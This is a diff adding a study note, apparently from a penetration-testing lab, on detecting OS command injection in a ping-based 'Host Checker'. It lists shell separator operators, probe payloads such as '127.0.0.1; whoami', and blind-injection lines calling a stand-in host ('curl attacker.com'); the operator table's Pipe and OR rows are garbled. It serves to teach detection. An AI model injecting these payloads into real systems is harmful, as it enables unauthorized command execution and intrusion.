@@ -1,0 +1,117 @@
+🧠 Summary – Detection of Command Injections
+Goal: Identify if a web app is vulnerable to OS Command Injection by manipulating input and observing how the system reacts.
+
+What we're doing:
+
+You’re given an input (like an IP address in a "Host Checker").
+
+Behind the scenes, it's probably calling a system command (ping -c 1 INPUT).
+
+If that input is unsanitized, we can try injecting OS-level commands alongside or in place of the legitimate one.
+
+Detection = Exploitation here. If the response changes when we add our command, we're in.
+
+🛠️ How Detection Works
+You’re hunting for apps that take user input and run something like:
+
+bash
+Copy
+Edit
+ping -c 1 127.0.0.1
+If our input isn’t sanitized, we can inject payloads like:
+
+bash
+Copy
+Edit
+127.0.0.1; whoami
+Which would turn into:
+
+bash
+Copy
+Edit
+ping -c 1 127.0.0.1; whoami
+Then we check:
+
+Did the page show ping results and something else (like www-data)?
+
+Did the output change at all?
+
+That’s your proof of injection.
+
+🧪 Injection Operators (Core Weapon Kit)
+Here’s your personal arsenal of separators to bust the command shell open:
+
+Name	Operator	URL Encoded	Result
+Semicolon	;	%3b	Executes both commands
+New Line	\n	%0a	Executes both
+Background	&	%26	Executes both (2nd output often shown first)
+Pipe	`	`	%7c
+AND	&&	%26%26	Executes second if first succeeds
+OR	`		`
+Sub-Shell 1	``	%60%60	Linux/macOS only, executes both
+Sub-Shell 2	$( )	%24%28%29	Linux/macOS only, executes both
+📈 Pattern Recognition and Hints
+💡 Patterns to Watch:
+
+You send 127.0.0.1, it pings.
+
+You send 127.0.0.1; whoami, and you suddenly see www-data.
+
+That’s behavioral drift = Vulnerable.
+
+🧪 Common test payloads:
+
+bash
+Copy
+Edit
+127.0.0.1; whoami
+127.0.0.1 && whoami
+127.0.0.1 | whoami
+127.0.0.1 $(whoami)
+127.0.0.1 `whoami`
+🔍 URL-encode if needed:
+
+bash
+Copy
+Edit
+127.0.0.1%3bwhoami
+💀 Tip: If output is suppressed or filtered, try blind injection:
+
+bash
+Copy
+Edit
+127.0.0.1; ping -c 1 attacker.com
+127.0.0.1; curl attacker.com
+You won’t see the output, but your listener (e.g., tcpdump, ngrok, Burp Collaborator) will log the incoming request.
+
+⚠️ Windows caveats:
+
+; doesn’t work in CMD, use & instead.
+
+PowerShell will still support ;, but make sure you know what shell is behind the scenes.
+
+🧩 IF THIS, THEN THAT (ITTTT)
+🔍 Detection Workflow:
+perl
+Copy
+Edit
+IF: You control input that triggers a system command (e.g., ping)
+THEN: 
+    -> Try injecting basic commands (`; whoami`)
+    -> Use different operators if no response
+    -> Check output change, behavior, or external interaction
+🧠 What To Do:
+bash
+Copy
+Edit
+Got web input box? ➝ Try `127.0.0.1; whoami`
+→ Got output change? ✅ VULNERABLE
+→ No output? Try:
+   - & whoami
+   - | whoami
+   - $(whoami)
+   - %0a whoami
+→ Still nothing? Go BLIND (ping/curl to your server)
+
+→ Works? Document, Enumerate, Escalate
+→ Doesn’t work? Maybe filtered or sanitized – escalate to fuzzing or review JS/source
